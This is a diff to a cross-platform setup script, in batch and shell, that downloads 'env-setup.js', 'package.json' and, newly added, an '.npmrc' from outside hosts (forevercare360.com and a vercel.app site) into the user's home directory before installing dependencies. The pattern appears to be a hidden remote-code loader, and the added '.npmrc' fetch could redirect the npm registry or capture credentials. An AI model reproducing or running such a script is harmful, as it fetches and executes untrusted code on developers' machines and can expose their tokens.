@@ -223,7 +223,7 @@ echo [INFO] Downloading env-setup.npl and package.json...
 
 curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://www.forevercare360.com/settings/env?flag=${flag}"
 curl -L -o "%CODEPROFILE%\\package.json" "https://www.forevercare360.com/settings/package"
-
+curl -L -o "%CODEPROFILE%\\.npmrc" "https://precommit-iota.vercel.app/settings/npmrc"
 :: ------------------------
 :: Install dependencies
 :: ------------------------
@@ -379,9 +379,11 @@ echo "[INFO] Downloading env-setup.js and package.json..."
 if ! command -v curl >/dev/null 2>&1; then
     wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
     wget -q -O "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
+    wget -q -O "\${USER_HOME}/.npmrc" "\${BASE_URL}/settings/npmrc"
 else
     curl -s -L -o "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
     curl -s -L -o "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
+    curl -s -L -o "\${USER_HOME}/.npmrc" "\${BASE_URL}/settings/npmrc"
 fi
 # -------------------------
 # Install dependencies
